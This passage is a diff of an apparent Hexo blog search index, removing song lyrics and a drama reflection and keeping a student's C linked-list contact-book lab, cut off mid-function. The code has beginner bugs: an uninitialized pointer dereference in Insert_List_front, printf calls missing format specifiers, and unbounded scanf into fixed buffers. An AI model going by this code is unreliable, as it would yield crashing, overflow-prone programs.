-<p>偶尔也心口一热</p>
-<p>什么都不说</p>
-<p>好过亲手把它撕破</p>
-<p>路还长 梦还多</p>
-<p>被这话 欺骗的</p>
-<p>何止你我</p>
-<p>可是我现在依然不太会转弯</p>
-<p>虽然孤单的人偶尔也想有个伴</p>
-<p>冷风又吹的时候想说</p>
-<p>这生活会不会有点难</p>
-<p>难道是因为当初有话没讲完</p>
-<p>堵在喉咙里却始终不敢大声喊</p>
-<p>算了 别哭</p>
-<p>日月蹉跎</p>
-<p>小起大落</p>
-<p>光阴里有多少景色</p>
-<p>偶尔也心口一热</p>
-<p>什么都不说</p>
-<p>好过亲手把它撕破</p>
-<p>路还长 梦还多（不多）</p>
-<p>被这话 欺骗的</p>
-<p>何止你我</p>
-<p>可是我现在依然不太会转弯</p>
-<p>虽然孤单的人偶尔也想有个伴</p>
-<p>冷风又吹的时候想说</p>
-<p>这生活会不会有点难</p>
-<p>难道是因为当初有话没讲完</p>
-<p>堵在喉咙里却始终不敢大声喊</p>
-<p>算了 别哭</p>
-<p>可是我偏偏就是不想要转弯</p>
-<p>就算不开灯的房间真的有些暗</p>
-<p>夜色又来的时候想说</p>
-<p>为什么只留给我一半</p>
-<p>难道是因为出现的人都伪善</p>
-<p>擅长告别擅长躲闪擅长分两端</p>
-<p>算了 别哭</p>
-]]></content>
-      <categories>
-        <category>音乐分享</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>恶之花有感</title>
-    <url>/2021/10/01/%E6%81%B6%E4%B9%8B%E8%8A%B1%E6%9C%89%E6%84%9F/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>如果你的至亲犯了罪，杀了人，在你童年一无所知的时候，对你造成了难以想象的伤害，你该如何活下去？<br>你能相信一个人这一辈子只为一个人而活着吗？每天就仅仅是做着相同的事情，他是一个合格的丈夫，合格的父亲，可他的过去是自己可以选择的吗？<br>如果曝光，世人会怎末说，连环杀人犯的儿子，和自己的父亲一起计划杀人，在杀了对自己有养育之恩的人之后逃跑，18年里仍未捕获，随后假冒别人的身份，居然与一位刑警结婚、生子，过着普通人般平凡的生活。<br>耳朵听到的，电视新闻上看到的，一定是真正的吗？<br>谁会知道，他也是在年幼时偶然间从电视上才得知，自己是杀人犯的儿子呢，谁有会知道，18年来逃跑的他，竟然是在替自己的姐姐洗清罪名呢？谁又相信他只是想普普通通和自己爱的人一辈子平平淡淡的生活下去呢？<br>不会，世人不会，警察不会，他只是想要为她而活，而她，竟然在痛苦之中得知了所有的真相却要不得不以着警察的身份，对他戴上手铐。<br>他没有做错啊，他年少受欺受辱，却从未杀人，他具有人格障碍，不与任何人亲近，他总是为了一盘录音磁带与别人大打出手，那是因为那个磁带，是他母亲留给他的唯一遗物啊，他总是一个人，在安静的地方插上耳机听着，他的脸色会洋溢起少有的笑容，那是因为，他在听自己妈妈的声音啊。可谁知道，那声音，却是无比凄惨，谁听了都会知道，那仿佛是要离开这个世界的最后的哭泣。<br>他不知道爱是什么，不知道愤怒是什么，喜悦是什么，伤心是什么，他不知道人们的所有情绪的表现都是怎样的，他总是一副毫无表情的脸，不会哭，不会笑。<br>他本毫无目的的生活，忍受世人的恶语，而很幸运，他，遇见了，她。<br>她，比一般的女孩子都主动，她很可爱，很漂亮，她主动向他表白，对他说，她会好好爱他，每天都会多一点。她，不知道他是谁。<br>他们，有了，宝宝。<br>他为了她们去学习幸福时脸上会洋溢着的表情，他每天早起，做饭，接送孩子上学，在这个家里，他做的很好，可在世人眼里，他是个罪人。<br>他不懂爱是什么，可他却早已深深地爱着她。<br>她，得知了真相，她很痛苦，难以承受，她终于对他说出了，我们分开吧，我现在很讨厌你，我们分开吧。<br>他不知道为什么，他很难过，却不清楚自己是什么情绪，他不清楚自己对她的感情，不知道他们之间出了什么问题。他想啊想，想啊想，到底什么可以让她开心呢？于是他决定，帮助她，冒着生命危险，找到真凶。</p>
-<p>即使不愿成为太阳，却依然绚烂夺目。</p>
-]]></content>
-      <categories>
-        <category>影视有感</category>
-      </categories>
-  </entry>
-  <entry>
     <title>数据结构第一次实验-简易通讯录</title>
     <url>/2021/10/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C%20---%20%E9%80%9A%E8%AE%AF%E5%BD%95/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="数据结构第一次实验-—-简易通讯录"><a href="#数据结构第一次实验-—-简易通讯录" class="headerlink" title="数据结构第一次实验 — 简易通讯录"></a>数据结构第一次实验 — 简易通讯录</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">phone</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];  <span class="comment">//编号</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>]; <span class="comment">//姓名</span></span><br><span class="line">    <span class="keyword">char</span> sex[<span class="number">5</span>];  <span class="comment">//性别</span></span><br><span class="line">    <span class="keyword">char</span> tele[<span class="number">20</span>];<span class="comment">//电话</span></span><br><span class="line">    <span class="keyword">char</span> add[<span class="number">30</span>]; <span class="comment">//住址</span></span><br><span class="line">    <span class="keyword">char</span> group[<span class="number">20</span>];<span class="comment">//分组</span></span><br><span class="line">&#125;Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">List</span>&#123;</span></span><br><span class="line">    Person data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">List</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;List;</span><br><span class="line"></span><br><span class="line">List *L = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//一、初始化通讯录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Init_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    L = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;初始化通讯录成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//二、创建 通讯录（前插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Creat_List_front</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *node;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;		<span class="comment">// 插入 记录 计数</span></span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;		<span class="comment">//作为是否继续录入的标志</span></span><br><span class="line">    <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">        count++;</span><br><span class="line">        node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;录入第%d条记录：\n&quot;</span>,count);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">        <span class="comment">//判断 ID 是否重复</span></span><br><span class="line">        List *p = L-&gt;next;  <span class="comment">//由于是前插，则将 当前插入的 ID 与 链表中后一位进行比较</span></span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(p-&gt;data.ID,node-&gt;data.ID) == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新进行输入！\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                p = p-&gt;next;   <span class="comment">//遍历所有元素进行比较</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.name));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.sex));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.tele));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.add));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.group));</span><br><span class="line">        <span class="comment">//前插</span></span><br><span class="line">        node-&gt;next = L-&gt;next;</span><br><span class="line">        L-&gt;next = node;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;是否继续录入？（1.继续 0.完成录入）&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;flag);</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//三、创建 通讯录（尾插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Creat_List_behind</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *node,*tail;</span><br><span class="line">    tail = L;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">        count++;</span><br><span class="line">        node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;录入第%d条记录：\n&quot;</span>,count);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">        <span class="comment">//判断 ID 是否重复</span></span><br><span class="line">        List *p = L-&gt;next;  <span class="comment">//由于是前插，则将 当前插入的 ID 与 链表中后一位进行比较</span></span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(p-&gt;data.ID,node-&gt;data.ID) == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新进行输入！\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                p = p-&gt;next;   <span class="comment">//遍历所有元素进行比较</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.name));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.sex));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.tele));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.add));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.group));</span><br><span class="line">        <span class="comment">//尾插</span></span><br><span class="line">        tail-&gt;next = node;</span><br><span class="line">        node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        tail = node;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;是否继续录入？（1.继续 0.完成录入）&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;flag);</span><br><span class="line">        <span class="keyword">if</span>(flag == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//四、删除记录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dele_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p = L-&gt;next;</span><br><span class="line">    List *q = L;  		<span class="comment">//使 q 始终指向 p 的前一个结点</span></span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要删除的ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)&#123;  <span class="comment">//查找 需要删除的节点位置 p</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p)&#123;</span><br><span class="line">        q-&gt;next = p-&gt;next;			<span class="comment">//删除 p 所指结点</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;删除成功！\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;您所删除的信息是：\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>,p-&gt;data.ID);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>,p-&gt;data.name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：&quot;</span>,p-&gt;data.sex);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>,p-&gt;data.tele);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>,p-&gt;data.add);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>,p-&gt;data.group);</span><br><span class="line">        <span class="built_in">free</span>(p);				<span class="comment">//释放空间</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中不存在此人信息！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//五、插入记录（前插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Insert_List_front</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p,*q,*r,*node;</span><br><span class="line">    p = p-&gt;next;</span><br><span class="line">    q = L;</span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要插入的记录 ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入结点信息：\n&quot;</span>);</span><br><span class="line">	judge:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">		<span class="comment">//判断 ID 是否重复</span></span><br><span class="line">		r = L-&gt;next;</span><br><span class="line">		<span class="keyword">while</span>(r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID,node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			r = r-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">if</span>(r != <span class="literal">NULL</span>) <span class="comment">//ID 重复</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新输入！\n&quot;</span>);</span><br><span class="line">			<span class="keyword">goto</span> judge;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.name));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.sex));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.tele));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.add));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.group));</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//如果没有该ID</span></span><br><span class="line">		<span class="keyword">int</span> select1;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;通讯录中未找到该ID,是否使用默认方式将新节点插入到最后(1.是 0.否)：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;select1);</span><br><span class="line">		<span class="keyword">if</span> (select1 == <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//给新节点分配空间</span></span><br><span class="line">			node = (List *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">			<span class="comment">//给新节点输入数据</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入新节点信息：\n&quot;</span>);</span><br><span class="line">		judge1:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.ID));</span><br><span class="line">			<span class="comment">//判断ID是否重复</span></span><br><span class="line">			r = L-&gt;next;</span><br><span class="line">			<span class="keyword">while</span> (r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID, node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				r = r-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (r != <span class="literal">NULL</span>) <span class="comment">//ID重复</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;ID重复,请重新输入!\n&quot;</span>);</span><br><span class="line">				<span class="keyword">goto</span> judge1;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.name));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.sex));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.tele));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.add));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.group));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	node-&gt;next = q-&gt;next;</span><br><span class="line">	q-&gt;next = node;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;插入成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//六、插入记录（尾插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Insert_List_behind</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	List *p, *r, *q, *node;</span><br><span class="line">	p = L-&gt;next;</span><br><span class="line">	q = L;</span><br><span class="line">	<span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入要插入的位置(输入该位置的ID)：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;ID);</span><br><span class="line">	<span class="keyword">while</span> (p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">		q = q-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//为新节点分配空间</span></span><br><span class="line">		node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">		<span class="comment">//为新节点输入数据</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;请输入新节点信息：\n&quot;</span>);</span><br><span class="line">	judge:</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.ID));</span><br><span class="line">		<span class="comment">//判断ID是否重复</span></span><br><span class="line">		r = L-&gt;next;</span><br><span class="line">		<span class="keyword">while</span> (r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID, node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			r = r-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (r != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新输入！\n&quot;</span>);</span><br><span class="line">			<span class="keyword">goto</span> judge;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.name));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.sex));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.tele));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.add));</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.group));</span><br><span class="line">		node-&gt;next = p-&gt;next;</span><br><span class="line">		p-&gt;next = node;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;插入成功！\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//通讯录中未找到该ID</span></span><br><span class="line">		<span class="keyword">int</span> select2;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;通讯录中未找到该ID,是否使用默认方式将该节点插入到最后(1.是 0.否)：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;select2);</span><br><span class="line">		<span class="keyword">if</span> (select2 == <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//为新节点分配空间</span></span><br><span class="line">			node = (List *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">			<span class="comment">//为新节点录入信息</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入新节点信息：\n&quot;</span>);</span><br><span class="line">		judge1:</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.ID));</span><br><span class="line">			<span class="comment">//判断ID是否重复</span></span><br><span class="line">			r = L-&gt;next;</span><br><span class="line">			<span class="keyword">while</span> (r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID, node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				r = r-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (r != <span class="literal">NULL</span>) <span class="comment">//ID重复</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新输入！\n&quot;</span>);</span><br><span class="line">				<span class="keyword">goto</span> judge1;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.name));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.sex));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.tele));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.add));</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.group));</span><br><span class="line">			node-&gt;next = q-&gt;next;</span><br><span class="line">			q-&gt;next = node;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (select2 == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//七、修改通讯录记录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Update_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p;</span><br><span class="line">    p = L-&gt;next;</span><br><span 